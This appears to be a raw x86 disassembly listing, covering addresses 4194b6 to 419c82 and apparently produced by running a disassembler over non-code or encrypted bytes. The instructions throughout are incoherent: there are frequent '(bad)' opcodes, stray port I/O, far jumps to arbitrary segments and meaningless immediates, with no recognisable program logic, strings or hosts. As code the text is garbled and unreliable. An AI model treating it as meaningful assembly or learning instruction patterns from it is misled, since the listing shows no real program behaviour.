  4194b6:	jmp    0x31d82dbf
  4194bb:	hlt    
  4194bc:	xlat   BYTE PTR ds:[ebx]
  4194bd:	adc    al,0x67
  4194bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194c0:	mov    bh,0x62
  4194c2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4194c4:	in     al,dx
  4194c5:	push   ebx
  4194c6:	adc    esi,edi
  4194c8:	jg     0x41944a
  4194ca:	mov    eax,ds:0x67edf0c5
  4194cf:	cmc    
  4194d0:	mov    ebx,0x921484ca
  4194d5:	inc    esp
  4194d6:	rol    BYTE PTR [ebx+0x45446edb],1
  4194dc:	mov    esp,0xcb9dd887
  4194e1:	mov    al,ds:0x4d53154d
  4194e6:	outs   dx,BYTE PTR ds:[esi]
  4194e7:	mov    bh,0x95
  4194e9:	jae    0x4194b3
  4194eb:	jae    0x4194c0
  4194ed:	mov    ebp,0x1fed4abb
  4194f2:	xor    ch,BYTE PTR [ecx-0x3e]
  4194f5:	mov    esi,0xe3c14373
  4194fa:	mov    ebx,0xb6ee0998
  4194ff:	addr16 jno 0x41950c
  419502:	inc    esp
  419503:	dec    DWORD PTR [ecx+0x2e9d4d62]
  419509:	mov    ebp,0x8924c031
  41950e:	pop    es
  41950f:	mov    ds:0x498e8209,al
  419514:	add    BYTE PTR [eax-0x630c7768],bh
  41951a:	repnz aam 0xe
  41951d:	add    DWORD PTR [esi+0x32],0x7009cb62
  419524:	push   ds
  419525:	add    DWORD PTR [eax],edx
  419527:	bound  esi,QWORD PTR [ebx-0x36be647d]
  41952d:	sub    DWORD PTR [eax+0x2dd7605c],esp
  419533:	pop    es
  419534:	cmp    eax,0x80dfb5e0
  419539:	rcl    BYTE PTR [eax+ebx*2],cl
  41953c:	push   0x34
  41953e:	jne    0x419563
  419540:	(bad)  
  419541:	fadd   st,st(6)
  419543:	nop
  419544:	push   es
  419545:	jo     0x419561
  419547:	cs ins DWORD PTR es:[edi],dx
  419549:	jno    0x41959d
  41954b:	outs   dx,DWORD PTR ds:[esi]
  41954c:	xchg   ecx,eax
  41954d:	push   0xffffff96
  41954f:	stos   BYTE PTR es:[edi],al
  419550:	jp     0x419555
  419552:	leave  
  419553:	call   0x909903
  419558:	mov    al,0x26
  41955a:	shl    ebp,0xd0
  41955d:	rep outs dx,BYTE PTR ds:[esi]
  41955f:	xor    al,0xe
  419561:	xchg   esp,eax
  419562:	cs mov esp,0xbe4eaa41
  419568:	xor    DWORD PTR [esi-0x10b16b98],edx
  41956e:	sbb    BYTE PTR [ebx+0x4508ed53],cl
  419574:	sbb    cl,BYTE PTR [ecx-0x24]
  419577:	test   eax,0x8957c7c4
  41957c:	mov    dl,0x0
  41957e:	xchg   ecx,eax
  41957f:	pusha  
  419580:	jae    0xe3758b0e
  419586:	pop    ds
  419587:	or     bh,BYTE PTR [esi-0x79]
  41958a:	mov    ds:0xf3bab860,eax
  41958f:	mov    BYTE PTR [eax+0x39],cl
  419592:	popa   
  419593:	mov    ds:0xeadac27,al
  419598:	cmp    dh,BYTE PTR [ecx+0x6c]
  41959b:	jmp    0xdc97:0x8f2f8358
  4195a2:	inc    esp
  4195a3:	xchg   BYTE PTR [ecx+0x25a9e35],ch
  4195a9:	fnstenv [esi]
  4195ab:	jns    0x419624
  4195ad:	adc    edi,esp
  4195af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b0:	je     0x419556
  4195b2:	jmp    0x34c9:0x391d9613
  4195b9:	in     al,0xc
  4195bb:	out    dx,al
  4195bc:	xchg   DWORD PTR [esi+0x2d],ecx
  4195bf:	jecxz  0x41954c
  4195c1:	push   ss
  4195c2:	cmp    DWORD PTR [ebx],0x735a093d
  4195c8:	push   ecx
  4195c9:	sahf   
  4195ca:	xlat   BYTE PTR ds:[ebx]
  4195cb:	cmovno ecx,DWORD PTR [ebp+0x2b]
  4195cf:	je     0x419605
  4195d1:	enter  0x9cf9,0x6e
  4195d5:	jp     0x419643
  4195d7:	jp     0x4195df
  4195d9:	lds    eax,FWORD PTR [edx+eax*8]
  4195dc:	ror    DWORD PTR [esi+0x44],0x53
  4195e0:	pop    es
  4195e1:	adc    DWORD PTR [ecx],esi
  4195e3:	repz push ds
  4195e5:	ret    
  4195e6:	ret    
  4195e7:	inc    ebx
  4195e8:	push   ss
  4195e9:	cmp    cl,al
  4195eb:	clc    
  4195ec:	gs ret 
  4195ee:	into   
  4195ef:	gs mov ecx,0x55e9b88a
  4195f5:	jmp    FWORD PTR ds:0xfe055187
  4195fb:	xor    DWORD PTR [eax+0x22],ebx
  4195fe:	gs add eax,0xc3eeed3c
  419604:	inc    esi
  419605:	retf   0x7e74
  419608:	and    al,0x56
  41960a:	and    BYTE PTR [ebp-0x41],al
  41960d:	addr16 imul esi,ecx,0xffffffd5
  419611:	pushf  
  419612:	sahf   
  419613:	sub    eax,0x34aab95f
  419618:	sub    BYTE PTR [edi+0x72360171],0xdf
  41961f:	xlat   BYTE PTR ds:[ebx]
  419620:	sub    BYTE PTR [edi],dl
  419622:	xor    BYTE PTR [eax-0x38],dh
  419625:	pop    esi
  419626:	jmp    FWORD PTR [ecx]
  419628:	sbb    BYTE PTR [ebp+0x4f],dl
  41962b:	mov    edx,0x437172e
  419630:	test   DWORD PTR [eax+0x69],0x3abb6cb4
  419637:	xor    ecx,DWORD PTR [edx-0x4a]
  41963a:	mov    ah,0x79
  41963c:	std    
  41963d:	dec    edx
  41963e:	and    BYTE PTR [ecx],dl
  419640:	cli    
  419641:	inc    eax
  419642:	cmp    ecx,ecx
  419644:	jbe    0x419638
  419646:	push   eax
  419647:	and    al,dl
  419649:	push   ebx
  41964a:	push   0x77
  41964c:	and    DWORD PTR [eax],edi
  41964e:	in     al,dx
  41964f:	adc    al,0xbb
  419651:	cmp    bl,0x78
  419654:	shl    DWORD PTR [esi-0x4b128b96],0xd9
  41965b:	inc    edx
  41965c:	es dec edi
  41965e:	jle    0x4196b1
  419660:	xor    eax,0xb795d1b3
  419665:	jbe    0x419625
  419667:	mov    ebx,0x7f7b60ea
  41966c:	or     eax,0xe9b52725
  419671:	xchg   ebp,eax
  419672:	sbb    eax,0xfaa85e20
  419677:	nop
  419678:	adc    BYTE PTR [edx-0x43],ah
  41967b:	mov    edi,0xfb45fd5b
  419680:	(bad)  [ebp-0x2bc0e66a]
  419686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419687:	sbb    DWORD PTR [edx+0x4c],ebp
  41968a:	fbstp  TBYTE PTR [edi+ebp*2]
  41968d:	data16 mov ch,BYTE PTR [edx+eax*8+0x70]
  419692:	push   esp
  419693:	ss cmp eax,0x8e2fea07
  419699:	arpl   WORD PTR [edx-0x3bd5562],ax
  41969f:	inc    edi
  4196a0:	int3   
  4196a1:	and    al,0xd7
  4196a3:	add    bh,BYTE PTR [eax]
  4196a5:	xchg   ecx,edi
  4196a7:	das    
  4196a8:	imul   ecx,DWORD PTR [ecx+0x1a],0xffffffe6
  4196ac:	adc    BYTE PTR [edx+0x34],0x3
  4196b0:	xchg   esi,eax
  4196b1:	or     edx,0x5bae959c
  4196b7:	pmovmskb edx,mm3
  4196ba:	clc    
  4196bb:	fs imul eax,esi,0x14d60a77
  4196c2:	(bad)  [edx+0x64]
  4196c5:	mov    dl,0xf0
  4196c7:	(bad)  
  4196c8:	mov    ebx,DWORD PTR [ebx+0x79]
  4196cb:	pop    esp
  4196cc:	gs xchg esp,eax
  4196ce:	cld    
  4196cf:	add    eax,DWORD PTR [ecx+ebp*4-0x2de8e54d]
  4196d6:	mov    eax,0x7685fffe
  4196db:	cli    
  4196dc:	cli    
  4196dd:	or     eax,0x4467bfb6
  4196e2:	shl    BYTE PTR [edi+0x3dcdec25],0x8c
  4196e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ea:	pop    eax
  4196eb:	retf   0xb148
  4196ee:	add    al,0x50
  4196f0:	jb     0x419705
  4196f2:	leave  
  4196f3:	jg     0x419710
  4196f5:	fld    TBYTE PTR [edx]
  4196f7:	push   0xedcbb3f4
  4196fc:	repz out dx,al
  4196fe:	mov    ebx,0x995ec753
  419703:	in     al,0x2
  419705:	fmul   st(0),st
  419707:	cmc    
  419708:	popa   
  419709:	jecxz  0x4196cf
  41970b:	scas   al,BYTE PTR es:[edi]
  41970c:	sub    BYTE PTR [ebx],dh
  41970e:	jno    0x419696
  419710:	xor    eax,0x736c3bac
  419715:	sbb    BYTE PTR gs:[edx+ecx*2-0x69],al
  41971a:	sub    edx,DWORD PTR [ebp-0x5828fe5b]
  419720:	fidivr DWORD PTR [edi-0x502d0b31]
  419726:	mov    ch,0x3b
  419728:	push   0x2e
  41972a:	jmp    0xf69f213f
  41972f:	(bad)  
  419730:	int3   
  419731:	(bad)  
  419732:	cmp    ebp,esp
  419734:	and    al,0x94
  419736:	jge    0x41978b
  419738:	or     BYTE PTR [ecx+0x1a96bd8],al
  41973e:	xchg   BYTE PTR [eax],bl
  419740:	scas   eax,DWORD PTR es:[edi]
  419741:	out    dx,al
  419742:	and    al,0xc0
  419744:	mov    dl,0xe2
  419746:	loope  0x41974e
  419748:	inc    esi
  419749:	adc    eax,0x4bbcd4a9
  41974e:	xchg   esp,eax
  41974f:	(bad)
  419752:	ror    BYTE PTR [eax-0x5edc3277],1
  419758:	test   al,0xe5
  41975a:	stos   DWORD PTR es:[edi],eax
  41975b:	jne    0x4196e5
  41975d:	or     eax,0x9662dde7
  419762:	psrld  mm6,QWORD PTR [eax+edx*2+0x3ba9e2f6]
  41976a:	jbe    0x419784
  41976c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41976d:	push   0x33
  41976f:	repz daa 
  419771:	(bad)  
  419772:	mul    DWORD PTR [ebp+0x1d19a408]
  419778:	(bad)  [edx+0xdc7df60]
  41977e:	cmp    cl,0xb7
  419781:	fdiv   QWORD PTR [esi-0x20]
  419784:	cmp    dl,bl
  419786:	inc    ecx
  419787:	xlat   BYTE PTR ds:[ebx]
  419788:	and    al,0xfc
  41978a:	mov    ah,0xf1
  41978c:	mov    ch,0x6b
  41978e:	push   es
  41978f:	ins    BYTE PTR es:[edi],dx
  419790:	push   edi
  419791:	aad    0x93
  419793:	pop    ss
  419794:	and    cl,al
  419796:	and    DWORD PTR [ebp+0x27660d97],edi
  41979c:	mov    DWORD PTR [ebp+0x59],edi
  41979f:	pop    DWORD PTR ds:0x4aa02bac
  4197a5:	sahf   
  4197a6:	loop   0x419791
  4197a8:	pop    edx
  4197a9:	xchg   ebx,eax
  4197aa:	jo     0x4197f3
  4197ac:	mov    BYTE PTR [eax-0x4ddbcb7e],cl
  4197b2:	push   ecx
  4197b3:	inc    esp
  4197b4:	sbb    ebx,DWORD PTR [ecx]
  4197b6:	aam    0xe9
  4197b8:	ror    eax,cl
  4197ba:	test   DWORD PTR [ebx+0x166717c],esp
  4197c0:	add    eax,0x652c1f06
  4197c5:	daa    
  4197c6:	sti    
  4197c7:	mov    edi,0xe74158f3
  4197cc:	popf   
  4197cd:	(bad)  
  4197ce:	clc    
  4197cf:	dec    esi
  4197d0:	cmp    ecx,ecx
  4197d2:	gs in  al,dx
  4197d4:	jnp    0x419764
  4197d6:	call   DWORD PTR [edx]
  4197d8:	xor    bl,bl
  4197da:	inc    edx
  4197db:	and    eax,0xfa4b9ced
  4197e0:	test   BYTE PTR [ebp+0x7c],bh
  4197e3:	jl     0x419850
  4197e5:	in     al,0xc7
  4197e7:	mov    ecx,0x347a0377
  4197ec:	(bad)  
  4197ed:	loopne 0x419799
  4197ef:	icebp  
  4197f0:	rol    BYTE PTR ds:0xcde62c8e,1
  4197f6:	popf   
  4197f7:	cmp    ecx,esi
  4197f9:	sbb    eax,0xd439f485
  4197fe:	sub    edx,DWORD PTR [eiz*2+0x32056231]
  419805:	xchg   ebx,eax
  419806:	popf   
  419807:	lahf   
  419808:	fdiv   DWORD PTR [ebx-0x38]
  41980b:	aas    
  41980c:	bound  esp,QWORD PTR [ebx+edx*8]
  41980f:	adc    ebp,esi
  419811:	arpl   WORD PTR [edx-0x18a10a22],bx
  419817:	and    BYTE PTR ds:0x3878644f,ah
  41981d:	jae    0x41986f
  41981f:	jnp    0x4197c2
  419821:	xchg   ebp,eax
  419822:	les    ecx,FWORD PTR [ebx-0x5963259d]
  419828:	inc    esp
  419829:	adc    al,0x29
  41982b:	cmp    DWORD PTR [eax-0x4d83cc87],edx
  419831:	(bad)  
  419832:	mov    ah,0x6b
  419834:	fmul   st,st(2)
  419836:	xchg   ebp,eax
  419837:	adc    ch,BYTE PTR [esi-0x7050ad41]
  41983d:	dec    eax
  41983e:	mov    ds:0xdef3d622,al
  419843:	into   
  419844:	and    edx,edi
  419846:	sbb    DWORD PTR [edx+esi*1+0x24863287],ebx
  41984d:	aam    0x57
  41984f:	aas    
  419850:	out    dx,al
  419851:	loop   0x419896
  419853:	push   ebp
  419854:	fadd   st,st(1)
  419856:	xchg   edi,eax
  419857:	ins    DWORD PTR es:[edi],dx
  419858:	mov    cl,0x5c
  41985a:	lea    ebx,[esi+0x17]
  41985d:	xor    DWORD PTR [edx+0x44],esp
  419860:	jbe    0x4198bf
  419862:	std    
  419863:	jl     0x419846
  419865:	push   ecx
  419866:	dec    eax
  419867:	lds    esi,FWORD PTR [ebx+edi*8-0x17c168e]
  41986e:	call   0x1722:0xb693da32
  419875:	mov    esp,0x4411bc86
  41987a:	push   ebp
  41987b:	push   ds
  41987c:	sub    bh,0x7e
  41987f:	mov    ah,0x7f
  419881:	adc    DWORD PTR [edi+0x4d],0x4b5d38ec
  419888:	mov    bh,0xc5
  41988a:	jb     0x41983e
  41988c:	sub    DWORD PTR [edi],ecx
  41988e:	jae    0x419817
  419890:	mul    BYTE PTR [edx+0x7]
  419893:	enter  0x68ed,0x19
  419897:	mov    esp,DWORD PTR [esi-0x57]
  41989a:	xchg   esi,eax
  41989b:	(bad)  
  41989c:	mov    al,0x1
  41989e:	add    DWORD PTR [edx+0x59],ebx
  4198a1:	or     al,0xd7
  4198a3:	xor    DWORD PTR [edx],ebx
  4198a5:	dec    edx
  4198a6:	adc    BYTE PTR [ebx+eax*1],ah
  4198a9:	inc    edx
  4198aa:	sbb    BYTE PTR [edi+0x19],ch
  4198ad:	dec    eax
  4198ae:	(bad)  
  4198af:	les    edx,FWORD PTR [ecx]
  4198b1:	xchg   BYTE PTR [ebp-0x5b],cl
  4198b4:	(bad)  
  4198b5:	xlat   BYTE PTR ds:[ebx]
  4198b6:	mov    WORD PTR ds:0x65083bc9,es
  4198bc:	rep ins DWORD PTR es:[edi],dx
  4198be:	outs   dx,DWORD PTR ds:[esi]
  4198bf:	loopne 0x41988e
  4198c1:	xchg   edi,eax
  4198c2:	adc    cl,BYTE PTR [edi+0x6b]
  4198c5:	(bad)  
  4198c6:	jns    0x4198a0
  4198c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198c9:	(bad)  
  4198cb:	xchg   esp,eax
  4198cc:	int3   
  4198cd:	xor    DWORD PTR [ecx-0xf],0xbb51cdfe
  4198d4:	or     ah,dh
  4198d6:	inc    ebp
  4198d7:	out    dx,eax
  4198d8:	jae    0x419949
  4198da:	pushf  
  4198db:	xchg   edx,eax
  4198dc:	mov    ebx,0xf6ee133
  4198e1:	adc    DWORD PTR [esp+ebp*8-0x43],ebp
  4198e5:	xlat   BYTE PTR ds:[ebx]
  4198e6:	shl    BYTE PTR [eax-0x2b38da49],0xaa
  4198ed:	xchg   ecx,ecx
  4198ef:	pop    ds
  4198f0:	loope  0x4198dc
  4198f2:	push   ds
  4198f3:	sbb    eax,0xea91c680
  4198f8:	int    0xc9
  4198fa:	jecxz  0x419952
  4198fc:	outs   dx,BYTE PTR ds:[esi]
  4198fd:	and    eax,0x5e56b411
  419902:	adc    eax,DWORD PTR [esi+0x5a]
  419905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419907:	(bad)  
  419908:	xor    al,0xfc
  41990a:	sti    
  41990b:	sub    ecx,edx
  41990d:	cwde   
  41990e:	pop    ebx
  41990f:	aas    
  419910:	mov    ebp,0xe55be49a
  419915:	(bad)  [edi]
  419917:	ss dec ebp
  419919:	scas   eax,DWORD PTR es:[edi]
  41991a:	int3   
  41991b:	adc    ebx,DWORD PTR [ebx+0x6cb3cb06]
  419921:	fs xchg ebp,eax
  419923:	jmp    0xcd26ab50
  419928:	out    dx,eax
  419929:	(bad)  
  41992b:	dec    ebx
  41992c:	scas   eax,DWORD PTR es:[edi]
  41992d:	xchg   BYTE PTR [ebx+0x30a18671],dl
  419933:	cs repz and dh,bl
  419937:	inc    esp
  419938:	loope  0x419911
  41993a:	out    dx,al
  41993b:	addr16 ss adc al,0x2c
  41993f:	jno    0x419976
  419941:	rol    BYTE PTR [eax-0x32],cl
  419944:	adc    ah,BYTE PTR [bx+di]
  419947:	loop   0x41993f
  419949:	mov    eax,ds:0xf3d3a5b9
  41994e:	dec    ebp
  41994f:	mov    al,0x73
  419951:	es adc ch,dl
  419954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419955:	add    edi,edx
  419957:	mov    dh,0x12
  419959:	sub    esp,DWORD PTR [ebx*1+0x1e3ca80d]
  419960:	dec    edx
  419961:	jle    0x4199a2
  419963:	(bad)  
  419964:	xor    DWORD PTR [esi-0x4b7833f5],ebx
  41996a:	xchg   edi,eax
  41996b:	movd   DWORD PTR [edx-0x53909947],mm6
  419972:	sti    
  419973:	and    al,0x30
  419975:	out    0x6,eax
  419977:	jne    0x41994f
  419979:	push   esp
  41997a:	out    0x3c,al
  41997c:	or     eax,edi
  41997e:	jno    0x41994e
  419980:	pop    ss
  419981:	test   ebp,ebp
  419983:	xchg   DWORD PTR [eax+ecx*2],eax
  419986:	jecxz  0x419943
  419988:	sub    BYTE PTR [esi-0x18c703fa],0xab
  41998f:	sbb    dh,0x3
  419992:	sar    BYTE PTR [eax-0x6c],1
  419995:	and    al,0x27
  419997:	pop    ds
  419998:	cmc    
  419999:	xor    esp,DWORD PTR [eax-0xf]
  41999c:	inc    ebx
  41999d:	ja     0x41999f
  41999f:	inc    ebp
  4199a0:	sbb    BYTE PTR [edi-0x681b4e0d],ch
  4199a6:	jecxz  0x419954
  4199a8:	aam    0x4e
  4199aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ab:	neg    BYTE PTR [ecx+0x40]
  4199ae:	scas   eax,DWORD PTR es:[edi]
  4199af:	or     ecx,DWORD PTR ds:0xeebc2132
  4199b5:	cli    
  4199b6:	sub    al,0x53
  4199b8:	arpl   WORD PTR ds:[esi],cx
  4199bb:	mov    bl,0xe5
  4199bd:	and    ebx,DWORD PTR [ebp+0x47431a49]
  4199c3:	push   edi
  4199c4:	add    al,0x69
  4199c6:	cmp    BYTE PTR [esi-0x49],ah
  4199c9:	add    BYTE PTR [edi-0x65],bh
  4199cc:	xchg   ebp,eax
  4199cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ce:	adc    ecx,DWORD PTR [esi]
  4199d0:	daa    
  4199d1:	or     edx,DWORD PTR [edx+ecx*1]
  4199d4:	pop    edx
  4199d5:	lods   eax,DWORD PTR ds:[esi]
  4199d6:	inc    ebp
  4199d7:	jno    0x41998e
  4199d9:	dec    ecx
  4199da:	pop    eax
  4199db:	push   ebp
  4199dc:	sbb    DWORD PTR [edi],0xffffffe6
  4199df:	push   edx
  4199e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199e1:	adc    eax,0xebf989bb
  4199e6:	pop    edx
  4199e7:	mov    ds:0x8f8b9f5f,eax
  4199ec:	jg     0x419a53
  4199ee:	push   edx
  4199ef:	mov    esp,0xe37c3a61
  4199f4:	test   eax,0x7a731569
  4199f9:	add    edx,DWORD PTR [edi]
  4199fb:	fimul  WORD PTR [ebx-0x15]
  4199fe:	add    ecx,0xa2998ee4
  419a04:	dec    ebp
  419a05:	mul    DWORD PTR [edi]
  419a07:	mov    WORD PTR [ecx-0x72],gs
  419a0a:	repnz test BYTE PTR [edi],al
  419a0d:	xchg   BYTE PTR [edi+0x6dd0ffe7],dl
  419a13:	jnp    0x4199dd
  419a15:	sbb    edx,eax
  419a17:	add    al,0xc5
  419a19:	add    BYTE PTR [ebp-0x24],0x18
  419a1d:	repnz sub al,0x45
  419a20:	push   ebx
  419a21:	xlat   BYTE PTR ds:[ebx]
  419a22:	scas   eax,DWORD PTR es:[edi]
  419a23:	push   eax
  419a24:	into   
  419a25:	xor    DWORD PTR [edi+0x16a2861f],0xb64f0724
  419a2f:	fmul   QWORD PTR [ebx]
  419a31:	(bad)  
  419a32:	pop    esp
  419a33:	shl    DWORD PTR [edx+0x3a],cl
  419a36:	xor    al,0x1b
  419a38:	addr16 gs jae 0x419a0d
  419a3c:	or     al,0x6b
  419a3e:	iret   
  419a3f:	mov    eax,ds:0x974f6ae8
  419a44:	loopne 0x419a8e
  419a46:	test   BYTE PTR [edi],dl
  419a48:	pop    ecx
  419a49:	xchg   esi,eax
  419a4a:	dec    eax
  419a4b:	push   ss
  419a4c:	jecxz  0x419a71
  419a4e:	sti    
  419a4f:	sbb    esp,ecx
  419a51:	nop
  419a52:	imul   ebp,DWORD PTR [ebx-0x272ad86b],0xffffffe8
  419a59:	mov    eax,0xec3ee087
  419a5e:	inc    edi
  419a5f:	sti    
  419a60:	or     al,0x4f
  419a62:	jns    0x7516df3a
  419a68:	or     ah,bh
  419a6a:	bnd jb 0x419a55
  419a6d:	nop
  419a6e:	sbb    cl,BYTE PTR [edx]
  419a70:	ret    
  419a71:	xchg   edx,eax
  419a72:	arpl   ax,bx
  419a74:	mov    es,WORD PTR [esi]
  419a76:	test   DWORD PTR ss:[ecx],ebp
  419a79:	fs (bad) 
  419a7b:	fstp   QWORD PTR [esi]
  419a7d:	mov    esi,0x8d176f7c
  419a82:	sar    BYTE PTR [eax+0x5ae9ceb6],1
  419a88:	adc    cl,BYTE PTR [ebp-0x5e]
  419a8b:	das    
  419a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a8d:	add    edi,edi
  419a8f:	xor    eax,0xeeae1faf
  419a94:	fist   WORD PTR [eax-0x2a]
  419a97:	jg     0x419a3f
  419a99:	js     0x419aa3
  419a9b:	cdq    
  419a9c:	sub    BYTE PTR [edx+0x4097c63d],ch
  419aa2:	cli    
  419aa3:	push   esp
  419aa4:	pusha  
  419aa5:	sub    cl,bl
  419aa7:	push   edx
  419aa8:	add    DWORD PTR [esi-0x137f8d92],edx
  419aae:	scas   al,BYTE PTR es:[edi]
  419aaf:	jns    0x419aa7
  419ab1:	and    dl,bl
  419ab3:	jge    0x419a7f
  419ab5:	dec    ecx
  419ab6:	shl    DWORD PTR ds:0xa000127f,cl
  419abc:	or     DWORD PTR [ecx+0x67],0xbf49b76e
  419ac3:	out    dx,eax
  419ac4:	pop    ss
  419ac5:	sbb    al,0xd9
  419ac7:	out    0x7e,al
  419ac9:	inc    ebx
  419aca:	data16 cmp bh,0x22
  419ace:	imul   edi,DWORD PTR [ebx+ecx*1],0xcb78e86e
  419ad5:	sub    ecx,esi
  419ad7:	or     edx,DWORD PTR [esi+0x76]
  419ada:	and    eax,DWORD PTR [edi+0x17]
  419add:	cmc    
  419ade:	lock fild QWORD PTR ds:0x84a4725c
  419ae5:	xor    ah,bl
  419ae7:	mov    bl,0xc9
  419ae9:	std    
  419aea:	test   al,0x47
  419aec:	inc    esi
  419aed:	mov    edx,0x240e974f
  419af2:	inc    ebx
  419af3:	lods   al,BYTE PTR ds:[esi]
  419af4:	(bad)  
  419af5:	bsr    ebp,DWORD PTR [ebp+0x3c11a97b]
  419afc:	push   0x31
  419afe:	call   0xddf5c251
  419b03:	xchg   ecx,eax
  419b04:	test   ah,bl
  419b06:	jne    0x419aed
  419b08:	sahf   
  419b09:	and    DWORD PTR [ebp-0x706e152a],eax
  419b0f:	fidivr WORD PTR [ecx+edi*1-0x78]
  419b13:	cmc    
  419b14:	xchg   DWORD PTR [ebp-0x3d10396e],ecx
  419b1a:	lods   al,BYTE PTR ds:[esi]
  419b1b:	inc    esi
  419b1c:	dec    eax
  419b1d:	xor    ebx,esi
  419b1f:	jnp    0x419b49
  419b21:	int    0x1c
  419b23:	cmp    DWORD PTR [ecx],eax
  419b25:	frstor [edi+0x16]
  419b28:	cmp    eax,0xeeaec45d
  419b2d:	ins    DWORD PTR es:[edi],dx
  419b2e:	push   esp
  419b2f:	sbb    al,0xc7
  419b31:	nop
  419b32:	adc    edx,DWORD PTR [eax+0x53]
  419b35:	sub    eax,DWORD PTR [esi+0x12dd790c]
  419b3b:	inc    esi
  419b3c:	or     eax,0x2d648bdc
  419b41:	dec    eax
  419b42:	mov    al,0x56
  419b44:	sub    al,0x91
  419b46:	mov    ah,0x7c
  419b48:	jp     0x419b20
  419b4a:	or     al,0xad
  419b4c:	jnp    0x419bc2
  419b4e:	push   ecx
  419b4f:	daa    
  419b50:	xor    edi,DWORD PTR [eax+0x2e]
  419b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b54:	or     al,0x1f
  419b56:	cmp    eax,0x73a57442
  419b5b:	dec    esp
  419b5c:	mov    ah,0x1b
  419b5e:	mov    DWORD PTR [ebx*2+0x5932d0bd],esi
  419b65:	pop    edi
  419b66:	mov    WORD PTR [ecx+eax*4+0x3d],cs
  419b6a:	nop
  419b6b:	test   al,0x60
  419b6d:	sbb    esi,esi
  419b6f:	sub    ecx,DWORD PTR [edi+edx*4]
  419b72:	push   esi
  419b73:	push   ebp
  419b74:	loope  0x419b64
  419b76:	pop    esp
  419b77:	das    
  419b78:	out    dx,al
  419b79:	in     al,dx
  419b7a:	xor    BYTE PTR [esi],bl
  419b7c:	call   0x5af3e660
  419b81:	imul   esp,DWORD PTR [ecx],0x3542be08
  419b87:	mov    DWORD PTR [eax+0x26],esi
  419b8a:	cmp    ebp,esi
  419b8c:	and    BYTE PTR [eax],al
  419b8e:	popf   
  419b8f:	test   edi,ebx
  419b91:	sbb    eax,0x1e608441
  419b96:	jnp    0x419beb
  419b98:	shr    BYTE PTR [edi+0x26f69ec2],0xf9
  419b9f:	and    esp,esp
  419ba1:	adc    DWORD PTR [eax-0x1f916926],edx
  419ba7:	aam    0x50
  419ba9:	outs   dx,DWORD PTR ds:[esi]
  419baa:	retf   0x32a2
  419bad:	lods   eax,DWORD PTR ss:[esi]
  419baf:	ins    BYTE PTR es:[edi],dx
  419bb0:	add    bl,dh
  419bb2:	mov    esi,0x30629fbb
  419bb7:	inc    ecx
  419bb8:	xor    eax,0x541ae03
  419bbd:	lahf   
  419bbe:	enter  0xa881,0xe6
  419bc2:	jne    0x419c26
  419bc4:	fdivr  QWORD PTR [esi]
  419bc6:	xor    edi,DWORD PTR [eax]
  419bc8:	cdq    
  419bc9:	push   ebx
  419bca:	dec    ebp
  419bcb:	add    bl,BYTE PTR [edx-0x57]
  419bce:	mov    esp,0xe28601a2
  419bd3:	(bad)
  419bd7:	pop    es
  419bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bd9:	shl    DWORD PTR [edi-0x1],0x89
  419bdd:	mov    ebp,0x638cbb9d
  419be2:	jge    0x419c2c
  419be4:	das    
  419be5:	pop    eax
  419be6:	sub    eax,0x322a7ab8
  419beb:	gs or  al,0x6c
  419bee:	test   eax,0x62076c8f
  419bf3:	div    BYTE PTR [edi-0x7e]
  419bf6:	push   es
  419bf7:	addr16 call 0x8daf7aa6
  419bfd:	sub    eax,0x7f048778
  419c02:	cld    
  419c03:	out    0xaa,eax
  419c05:	cmp    BYTE PTR [ecx-0x238cf573],cl
  419c0b:	(bad)  
  419c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c0d:	outs   dx,DWORD PTR ds:[esi]
  419c0e:	and    ch,BYTE PTR [eax]
  419c10:	out    dx,eax
  419c11:	mov    ah,BYTE PTR [esi]
  419c13:	ds jmp 0x7d946960
  419c19:	xchg   esi,eax
  419c1a:	and    DWORD PTR [esi],esi
  419c1c:	add    ch,ah
  419c1e:	stos   BYTE PTR es:[edi],al
  419c1f:	pusha  
  419c20:	stc    
  419c21:	push   0x25ecc2b0
  419c26:	adc    ecx,DWORD PTR [edi+esi*4-0x2d]
  419c2a:	les    ecx,FWORD PTR [ecx]
  419c2c:	fisub  DWORD PTR [ebx+0x26545532]
  419c32:	push   ss
  419c33:	popf   
  419c34:	jge    0x419c8d
  419c36:	jge    0x419c75
  419c38:	(bad)  
  419c39:	fnstenv [esi-0x21e6da40]
  419c3f:	lods   al,BYTE PTR ds:[esi]
  419c40:	shl    DWORD PTR [ecx+0x31],cl
  419c43:	mov    esp,0x20b9f35a
  419c48:	xor    edi,0x54
  419c4b:	jg     0x419c25
  419c4d:	js     0x419c7b
  419c4f:	add    ch,ah
  419c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c52:	mov    gs,eax
  419c54:	imul   ebx,DWORD PTR [esi+ebp*2+0xe],0x9439d56d
  419c5c:	cmp    bh,dl
  419c5e:	stc    
  419c5f:	(bad)  
  419c60:	dec    ecx
  419c61:	sbb    eax,0x3c65690b
  419c66:	fadd   DWORD PTR [edx+0x198614e5]
  419c6c:	cmp    ebp,ebp
  419c6e:	call   0x6b1d2744
  419c73:	inc    edi
  419c74:	add    BYTE PTR [eax-0x75],bh
  419c77:	sar    BYTE PTR [ebx+0x5b],cl
  419c7a:	pop    ebp
  419c7b:	inc    ebx
  419c7c:	push   0x7e39a41a
  419c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c82:	inc    esp
